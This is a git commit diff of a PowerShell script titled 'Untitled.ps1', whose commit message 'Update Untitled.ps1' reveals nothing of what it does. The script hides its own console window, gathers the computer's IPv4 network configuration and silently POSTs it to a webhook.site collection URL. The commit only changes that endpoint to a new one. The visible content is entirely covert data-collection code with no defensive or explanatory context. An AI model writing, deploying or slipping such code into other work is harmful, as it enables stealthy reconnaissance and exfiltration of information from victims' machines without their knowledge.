725428fbcdf49c071f981e9efc253a98e10b1595
eooj <99329263+eooj@users.noreply.github.com>
2022-10-06 15:21:34 +0100

    Update Untitled.ps1

--- Untitled.ps1
+++ Untitled.ps1
@@ -3,5 +3,5 @@ add-type -name win -member $t -namespace native
 [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
 
 $string = get-netipaddress -addressfamily ipv4 | out-string
-invoke-webrequest -Uri https://webhook.site/d8e24cd1-bcf8-4e9a-88c5-734ccf47ea26 -Method POST -Body $string
+invoke-webrequest -Uri  	https://webhook.site/0c4603ea-408e-4feb-9af9-cba112e9c552 -Method POST -Body $string
 exit
